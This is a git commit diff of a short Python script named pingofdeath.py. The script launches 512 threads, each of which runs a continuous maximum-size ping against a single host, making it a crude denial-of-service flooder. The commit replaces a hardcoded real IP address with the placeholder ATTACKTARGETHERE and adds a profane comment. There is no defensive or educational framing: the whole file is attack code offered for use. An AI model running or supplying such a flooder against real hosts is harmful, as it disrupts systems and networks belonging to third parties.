47a6e10fb0977784c6dcf16b2680c299c883cf93
Stoned Paul <45460445+StonedPaul@users.noreply.github.com>
2021-06-16 06:21:30 -0600

    Update pingofdeath.py

--- pingofdeath.py
+++ pingofdeath.py
@@ -1,8 +1,9 @@
 import os
 import threading
 def ping():
-    os.system(f"ping 136.36.175.68 -t -l 65500")
+    os.system(f"ping ATTACKTARGETHERE -t -l 65500")
 print(5000*"[]")
 for i in range(512):
     thead = threading.Thread(target=ping,name=f'TH{i}')
     thead.start()
+#currently only supported on windows, i'm lazy as fuck so fuck off
